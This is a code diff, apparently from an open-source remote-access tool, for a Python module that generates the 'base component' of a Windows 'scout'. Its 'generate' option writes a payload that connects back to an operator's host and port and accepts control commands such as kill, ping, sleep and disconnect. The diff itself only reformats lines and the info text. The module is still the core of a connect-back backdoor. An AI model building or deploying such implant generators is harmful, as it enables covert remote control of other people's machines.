@@ -1,7 +1,8 @@
-#verified
+# verified
 import library.modules.config as config
 
 config.main()
+
 
 def main(option):
     if option == 'generate':
@@ -12,7 +13,7 @@ def main(option):
         filepath = config.scout_values['Path'][0]
         config.import_statements.append('import socket')
         config.import_statements.append('from time import sleep')
-        f = open(filepath,'w')
+        f = open(filepath, 'w')
         f.write('''
 def recv_all(sock):
     sock.settimeout(None)
@@ -65,11 +66,12 @@ while True:
             s.sendall('[-]Please supply valid arguments for the command you are running')
         except Exception as e:
             s.sendall('[!]Error in scout : ' + str(e))
-'''.replace('variable_timeout',timeout).replace('variable_host',host).replace('variable_port',port).replace('variable_key',key))
+'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
+            'variable_key', key))
         f.close()
     elif option == 'info':
         print '\nName             : Base component' \
               '\nOS               : Windows' \
               '\nRequired Modules : socket, time' \
-              '\nCommands         : kill,ping,sleep,disconnect' \
+              '\nCommands         : kill, ping, sleep <time>, disconnect' \
               '\nDescription      : The base component of the scout, it allows it to connect back to the server and supports connection status commands\n'
